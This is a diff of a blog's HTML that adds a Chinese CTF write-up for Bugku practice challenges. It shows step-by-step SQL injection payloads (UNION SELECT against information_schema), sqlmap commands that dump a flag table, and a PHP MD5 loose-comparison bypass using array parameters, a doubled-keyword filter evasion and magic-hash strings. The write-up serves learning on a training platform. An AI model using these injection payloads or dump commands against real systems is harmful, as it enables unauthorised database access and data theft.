@@ -6,14 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://sunzhengyu99.github.io">
-  <title>Tag: https://www.bilibili.com/video/BV1qJ411S7F6 | 一路走到黑</title>
+  <title>Bugku | 一路走到黑</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="一路走到黑">
-<meta property="og:url" content="https://sunzhengyu99.github.io/tags/https-www-bilibili-com-video-BV1qJ411S7F6/index.html">
+  <meta name="description" content="Bugku刷题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bugku">
+<meta property="og:url" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/index.html">
 <meta property="og:site_name" content="一路走到黑">
+<meta property="og:description" content="Bugku刷题">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd1.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd2.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd3.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd4.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd5.png">
+<meta property="article:published_time" content="2020-08-08T14:40:51.000Z">
+<meta property="article:modified_time" content="2020-08-08T15:17:48.992Z">
 <meta property="article:author" content="sunzy">
+<meta property="article:tag" content="by sunzy">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd1.png">
   
     <link rel="alternative" href="/atom.xml" title="一路走到黑" type="application/atom+xml">
   
@@ -145,61 +156,241 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Bugku" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/07/18/%E7%88%AC%E5%9B%BE/" class="archive-article-date">
-  	<time datetime="2020-07-18T09:40:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-18</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/07/18/%E7%88%AC%E5%9B%BE/">爬图</a>
+    <h1 class="article-title" itemprop="name">
+      Bugku
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2020/08/08/Bugku/" class="archive-article-date">
+  	<time datetime="2020-08-08T14:40:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Bugku刷题"><a href="#Bugku刷题" class="headerlink" title="Bugku刷题"></a>Bugku刷题</h1><a id="more"></a>
+<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><pre><code>`  1&apos; and 1=1 # `     
+
+`  1&apos; and 1=2 # `    </code></pre><p>   不显示内容，可以判断存在注入点</p>
+<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4#可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4</code>#可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><pre><code>` -1&apos; union select 1,database(),3,4 #`
+
+  database:skctf_flag</code></pre><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre><p> table:fl4g,sc</p>
+<h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre><p> skctf_flag</p>
+<p> 得到flag</p>
+<p> (select skctf_flag from skctf_flag.fl4g)</p>
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p> <strong>因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中</strong></p>
+<p><img src="/2020/08/08/Bugku/cjd1.png" alt></p>
+<h3 id="1-获取数据库"><a href="#1-获取数据库" class="headerlink" title="1.获取数据库"></a>1.获取数据库</h3><pre><code>python2 sqlmap.py -r a.txt --dbs</code></pre><p><img src="/2020/08/08/Bugku/cjd2.png" alt></p>
+<h3 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables</code></pre><p><img src="/2020/08/08/Bugku/cjd3.png" alt></p>
+<h3 id="3-获取列名"><a href="#3-获取列名" class="headerlink" title="3.获取列名"></a>3.获取列名</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns</code></pre><p><img src="/2020/08/08/Bugku/cjd4.png" alt></p>
+<h3 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="4.获取flag"></a>4.获取flag</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump</code></pre><p><img src="/2020/08/08/Bugku/cjd5.png" alt></p>
+<hr>
+<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p> 扫描发现了index.php，通过  index.php.bak下载网页源码</p>
+<pre><code>&lt;?php
+/**
+ * Created by PhpStorm.
+ * User: Norse
+ * Date: 2017/8/6
+ * Time: 20:22
+*/
+
+include_once &quot;flag.php&quot;;
+ini_set(&quot;display_errors&quot;, 0);
+$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);
+$str = substr($str,1);
+$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);
+parse_str($str);
+echo md5($key1);
+
+echo md5($key2);
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){
+echo $flag.&quot;取得flag&quot;;
+}
+?&gt;</code></pre><p> 对上传的值进行了过滤key, kekeyy可以绕过</p>
+<p> 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
+<p> 2.利用==比较漏洞</p>
+<p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
+<p> 下列的字符串的MD5值都是0e开头的：</p>
+<pre><code>QNKCDZO
+
+240610708
+
+s878926199a
+
+s155964671a
+
+s214587387a
+
+s214587387a</code></pre><hr>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">https://www.bilibili.com/video/BV1qJ411S7F6</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">by sunzy</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://sunzhengyu99.github.io/2020/08/08/Bugku/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2020/07/18/%E6%9C%A8%E9%A9%AC/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">木马</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+ 
+  <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC80OTI1Ni8yNTc1MA==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
   
 
-    
+  
+  
+  
 
+  
+
+  
+
+  
 
 
           </div>
@@ -224,9 +415,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
